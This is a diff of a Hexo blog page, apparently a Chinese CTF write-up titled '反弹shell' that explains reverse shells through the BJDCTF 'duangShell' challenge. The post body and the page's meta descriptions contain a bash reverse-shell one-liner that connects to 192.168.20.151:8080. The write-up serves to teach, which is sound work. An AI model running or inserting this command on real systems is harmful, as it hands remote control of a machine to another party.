@@ -79,12 +79,21 @@
 
 
 
-<meta property="og:type" content="website">
-<meta property="og:title" content="Hexo">
-<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;index.html">
+<meta name="description" content="从BJDCTF中的一道题来引入反弹shell这个知识点，因为本人过菜之前不知道还有这个知识，今天有空就写一下知识点，记录下该题。 1、前提知识：bash反弹shell1bash -i &amp;gt;&amp;amp; &amp;#x2F;dev&amp;#x2F;tcp&amp;#x2F;192.168.20.151&amp;#x2F;8080 0&amp;gt;&amp;amp;1  bash一句话命令详解以下针对常用的bash反弹一句话进行了拆分说明，具">
+<meta property="og:type" content="article">
+<meta property="og:title" content="反弹shell">
+<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;04&#x2F;07&#x2F;%E5%8F%8D%E5%BC%B9shell&#x2F;index.html">
 <meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="从BJDCTF中的一道题来引入反弹shell这个知识点，因为本人过菜之前不知道还有这个知识，今天有空就写一下知识点，记录下该题。 1、前提知识：bash反弹shell1bash -i &amp;gt;&amp;amp; &amp;#x2F;dev&amp;#x2F;tcp&amp;#x2F;192.168.20.151&amp;#x2F;8080 0&amp;gt;&amp;amp;1  bash一句话命令详解以下针对常用的bash反弹一句话进行了拆分说明，具">
 <meta property="og:locale" content="en">
+<meta property="og:image" content="https:&#x2F;&#x2F;imgconvert.csdnimg.cn&#x2F;aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy85MTEzOTgxLTQ4OTdlODU4NmExZWJlYjQucG5n">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;04&#x2F;07&#x2F;%E5%8F%8D%E5%BC%B9shell&#x2F;F:%5Cblog%5Chexo%5Csource_posts%5C%E5%8F%8D%E5%BC%B9shell%5C1586258681040.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;04&#x2F;07&#x2F;%E5%8F%8D%E5%BC%B9shell&#x2F;C:%5CUsers%5C10173%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1586257288904.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;04&#x2F;07&#x2F;%E5%8F%8D%E5%BC%B9shell&#x2F;C:%5CUsers%5C10173%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1586258736780.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;04&#x2F;07&#x2F;%E5%8F%8D%E5%BC%B9shell&#x2F;C:%5CUsers%5C10173%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1586258801638.png">
+<meta property="og:updated_time" content="2020-04-07T15:14:26.958Z">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https:&#x2F;&#x2F;imgconvert.csdnimg.cn&#x2F;aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy85MTEzOTgxLTQ4OTdlODU4NmExZWJlYjQucG5n">
 
 
 
@@ -114,13 +123,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/"/>
+  <link rel="canonical" href="http://yoursite.com/2020/04/07/反弹shell/"/>
 
 
 
 
 
-  <title>Hexo</title>
+  <title>反弹shell | Hexo</title>
   
 
 
@@ -139,8 +148,7 @@
     
   
 
-  <div class="container sidebar-position-left 
-  page-home">
+  <div class="container sidebar-position-left page-post-detail">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -213,130 +221,9 @@
         <div class="content-wrap">
           <div id="content" class="content">
             
-  <section id="posts" class="posts-expand">
+
+  <div id="posts" class="posts-expand">
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/04/07/111/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/04/07/111/" itemprop="url">111</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-04-07T23:16:03+08:00">
-                2020-04-07
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p><img src="/2020/04/07/111/F:%5Cblog%5Chexo%5Csource_posts%5C111%5C1586258736780.png" alt="1586258681040"></p>
-<p><img src="/2020/04/07/111/F:%5Cblog%5Chexo%5Csource_posts%5C111%5C1586258801638.png" alt="1586258801638"></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
 
   
 
@@ -366,9 +253,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/04/07/%E5%8F%8D%E5%BC%B9shell/" itemprop="url">反弹shell</a></h1>
+          <h1 class="post-title" itemprop="name headline">反弹shell</h1>
         
 
         <div class="post-meta">
@@ -418,9 +303,7 @@
       
 
       
-        
-          
-            <p>从BJDCTF中的一道题来引入反弹shell这个知识点，因为本人过菜之前不知道还有这个知识，今天有空就写一下知识点，记录下该题。</p>
+        <p>从BJDCTF中的一道题来引入反弹shell这个知识点，因为本人过菜之前不知道还有这个知识，今天有空就写一下知识点，记录下该题。</p>
 <h2 id="1、前提知识："><a href="#1、前提知识：" class="headerlink" title="1、前提知识："></a>1、前提知识：</h2><h3 id="bash反弹shell"><a href="#bash反弹shell" class="headerlink" title="bash反弹shell"></a>bash反弹shell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.20.151&#x2F;8080 0&gt;&amp;1</span></pre></td></tr></table></figure>
 
 <p><strong>bash一句话命令详解</strong><br>以下针对常用的bash反弹一句话进行了拆分说明，具体内容如下。<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy85MTEzOTgxLTQ4OTdlODU4NmExZWJlYjQucG5n" alt="image.png"></p>
@@ -453,8 +336,6 @@
 <p>Linux 反弹shell（二）反弹shell的本质 <a href="https://xz.aliyun.com/t/2549" target="_blank" rel="noopener">https://xz.aliyun.com/t/2549</a></p>
 <p>Linux下几种常见的反弹shell方式 <a href="http://www.lin2zhen.top/index.php/archives/9/" target="_blank" rel="noopener">http://www.lin2zhen.top/index.php/archives/9/</a></p>
 
-          
-        
       
     </div>
     
@@ -471,12 +352,28 @@
       
 
       
+      
+      
 
       
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/04/07/111/" rel="prev" title="111">
+                111 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
 
       
-      
-        <div class="post-eof"></div>
       
     </footer>
   </div>
@@ -486,10 +383,11 @@
   </article>
 
 
-    
-  </section>
 
-  
+    <div class="post-spread">
+      
+    </div>
+  </div>
 
 
           </div>
@@ -497,6 +395,10 @@
 
 
           
+
+  
+
+
 
         </div>
         
@@ -517,8 +419,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -569,6 +480,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#1、前提知识："><span class="nav-number">1.</span> <span class="nav-text">1、前提知识：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#bash反弹shell"><span class="nav-number">1.1.</span> <span class="nav-text">bash反弹shell</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2、-BJDCTF-2nd-duangShell"><span class="nav-number">2.</span> <span class="nav-text">2、[BJDCTF 2nd]duangShell</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
@@ -702,6 +629,10 @@
   
 
   
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
 
   
 
